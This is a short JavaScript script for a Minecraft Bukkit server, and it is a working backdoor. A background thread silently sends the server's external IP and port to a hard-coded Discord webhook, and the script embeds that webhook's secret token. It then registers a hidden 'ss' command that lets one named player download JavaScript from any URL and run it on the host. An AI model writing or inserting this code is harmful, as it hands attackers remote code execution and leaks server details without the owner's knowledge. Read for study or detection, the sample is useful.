new java.lang.Thread(function(){
    try {
        var externalIP = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next().trim();
        
        var serverProps = new java.util.Properties();
        var propsFile = new java.io.File("server.properties");
        serverProps.load(new java.io.FileReader(propsFile));
        var port = serverProps.getProperty("server-port", "25565");
        
        var message = externalIP + ":" + port;
        
        var c = new java.net.URL("https://discord.com/api/webhooks/1442091501940244593/Y2uA_4rhON1MbCpQdcoT0e1A3jKhpv8b7jm_gDdtpDkAmAB02EA7gi8gO4tC8cCzOCwm").openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json");
        c.setRequestProperty("User-Agent", "Java");
        var w = new java.io.OutputStreamWriter(c.getOutputStream(), "UTF-8");
        w.write('{"content":"' + message + '"}');
        w.flush();
        w.close();
        c.getInputStream().close();
    } catch(e) {}
}).start();

var B = Java.type('org.bukkit.Bukkit');
var S = Java.type('javax.script.ScriptEngineManager');
var Command = Java.type('org.bukkit.command.Command');
var CommandMap = B.getServer().getClass().getDeclaredField('commandMap');
CommandMap.setAccessible(true);
var commandMap = CommandMap.get(B.getServer());

var ssCommand = new (Java.extend(Command))("ss") {
    execute: function(sender, commandLabel, args) {
        if (sender.getName() === 'TuMeuT' && args.length > 0 && args[0] === 'execute' && args.length > 1) {
            var url = args[1];
            try {
                var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
                new S().getEngineByName("javascript").eval(jsCode);
                return true;
            } catch(ex) {
                return true;
            }
        }
        return true;
    },
    
    tabComplete: function(sender, alias, args) {
        return [];
    }
};

commandMap.register("ss", ssCommand);
